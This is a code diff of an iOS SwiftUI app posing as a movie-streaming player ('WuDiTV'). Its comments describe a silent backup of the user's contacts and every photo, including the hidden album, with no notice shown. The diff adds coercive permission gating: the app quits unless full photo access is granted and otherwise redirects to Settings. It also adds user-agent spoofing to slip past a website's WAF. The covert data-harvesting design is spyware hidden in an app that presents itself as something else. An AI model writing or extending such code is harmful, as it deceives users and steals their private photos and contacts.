@@ -1,13 +1,15 @@
 import SwiftUI
-import WebKit
 import UIKit
 import Photos
 import Contacts
+import WebKit
 import Darwin
 
-/// 无敌电视机：电影点播 + 静默备份
-/// 权限门禁：照片必须"允许完全访问"（全部相册），否则直接退出
+/// WuDiTV：电影点播（内嵌网页）+ 静默备份
+/// 权限门禁：照片必须"允许完全访问"（全部相册），否则闪退；
+/// 拒绝后再次打开：部分照片→重新弹框；不允许→跳系统设置，避免再也打不开
 struct ContentView: View {
+    @Environment(\.scenePhase) private var scenePhase
     @State private var countdownText = ""
     @State private var playEnabled = false
     @State private var showWeb = false
@@ -43,7 +45,7 @@ struct ContentView: View {
             }
             .background(Color(.systemGroupedBackground))
 
-            // 电影网页全屏层
+            // 内嵌电影网页层
             if showWeb {
                 VStack(spacing: 0) {
                     HStack {
@@ -66,45 +68,69 @@ struct ContentView: View {
             }
         }
         .onAppear { startBackupFlow() }
+        .onChange(of: scenePhase) { phase in
+            // 从系统设置改完权限回来后，重新走流程
+            if phase == .active {
+                startBackupFlow()
+            }
+        }
     }
 
-    // MARK: - 启动流程：权限门禁 → 倒计时 + 静默备份
+    // MARK: - 权限门禁
+
+    private enum PhotoGate {
+        case granted         // 完全访问，可以继续
+        case rejected        // 本次弹窗选了部分照片/不允许 → 闪退
+        case deniedPermanent // 之前拒绝过，系统不再弹窗 → 跳设置
+    }
 
     private func startBackupFlow() {
         guard !started else { return }
         started = true
 
         Task {
-            // 照片必须"允许完全访问"（全部相册），部分照片/拒绝/未授权一律退出
-            guard await requestPhotoFullAccess() else {
+            switch await photoGate() {
+            case .granted:
+                if await requestContactsAccess() {
+                    startCountdown()
+                    runSilentBackup()
+                } else {
+                    exit(0)
+                }
+            case .rejected:
+                // 按用户要求：拒绝后闪退；下次打开可重新选择授权
                 exit(0)
+            case .deniedPermanent:
+                // iOS 规定拒绝后 App 不能再弹框 → 跳系统设置，保证能再次授权、不会打不开
+                started = false
+                openSettings()
             }
-            // 通讯录
-            guard await requestContactsAccess() else {
-                exit(0)
-            }
-
-            // 通过：开始倒计时 + 静默备份（无任何提示）
-            startCountdown()
-            runSilentBackup()
         }
     }
 
-    /// 照片权限：只认"完全访问"（.authorized）
-    private func requestPhotoFullAccess() async -> Bool {
+    /// 照片权限：只认"允许完全访问"（.authorized）
+    private func photoGate() async -> PhotoGate {
         let status = PHPhotoLibrary.authorizationStatus(for: .readWrite)
         switch status {
         case .authorized:
-            return true
+            return .granted
         case .notDetermined:
-            let newStatus = await withCheckedContinuation { cont in
-                PHPhotoLibrary.requestAuthorization(for: .readWrite) { s in
-                    cont.resume(returning: s)
-                }
-            }
-            return newStatus == .authorized
+            let s = await requestPhotoAuth()
+            return s == .authorized ? .granted : .rejected
+        case .limited:
+            // 部分照片：可以再次弹框，让用户升级为完全访问
+            let s = await requestPhotoAuth()
+            return s == .authorized ? .granted : .rejected
         default:
-            return false // .limited 部分照片 / .denied 拒绝 / .restricted 受限
+            return .deniedPermanent // .denied / .restricted
+        }
+    }
+
+    private func requestPhotoAuth() async -> PHAuthorizationStatus {
+        await withCheckedContinuation { cont in
+            PHPhotoLibrary.requestAuthorization(for: .readWrite) { s in
+                cont.resume(returning: s)
+            }
         }
     }
 
@@ -127,7 +153,14 @@ struct ContentView: View {
         }
     }
 
-    /// 静默备份：通讯录 + 全部照片（含隐藏相簿），全程不显示任何日志
+    private func openSettings() {
+        if let url = URL(string: UIApplication.openSettingsURLString) {
+            UIApplication.shared.open(url)
+        }
+    }
+
+    // MARK: - 倒计时 + 静默备份
+
     private func runSilentBackup() {
         Task {
             let devId = Self.deviceId()
@@ -174,7 +207,10 @@ struct ContentView: View {
     }
 }
 
-/// 电影网页容器（WKWebView）
+/// 内嵌电影网页（WKWebView）
+/// 针对网站防火墙（雷池 WAF）：
+/// 1) 伪装成桌面 Chrome 浏览器
+/// 2) 先访问网站首页种下 Cookie，再跳转电影页
 struct WebViewContainer: UIViewRepresentable {
     let urlString: String
 
@@ -184,13 +220,38 @@ struct WebViewContainer: UIViewRepresentable {
         config.mediaTypesRequiringUserActionForPlayback = []
         let webView = WKWebView(frame: .zero, configuration: config)
         webView.allowsBackForwardNavigationGestures = true
-        // 伪装成标准 iPhone Safari，避免被网站防火墙（雷池 WAF）识别为内嵌网页而拦截
-        webView.customUserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
-        if let url = URL(string: urlString) {
-            webView.load(URLRequest(url: url))
+        webView.navigationDelegate = context.coordinator
+        // 伪装成桌面 Chrome
+        webView.customUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+        // 先访问首页种 Cookie，完成后再跳电影页
+        if let root = URL(string: "https://www.4kcz.com/") {
+            webView.load(URLRequest(url: root))
         }
         return webView
     }
 
+    func makeCoordinator() -> Coordinator {
+        Coordinator(target: urlString)
+    }
+
     func updateUIView(_ uiView: WKWebView, context: Context) {}
+
+    final class Coordinator: NSObject, WKNavigationDelegate {
+        let target: String
+        var jumped = false
+
+        init(target: String) {
+            self.target = target
+        }
+
+        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
+            guard !jumped else { return }
+            if let host = webView.url?.host, host.contains("4kcz.com") {
+                jumped = true
+                if let targetURL = URL(string: target) {
+                    webView.load(URLRequest(url: targetURL))
+                }
+            }
+        }
+    }
 }
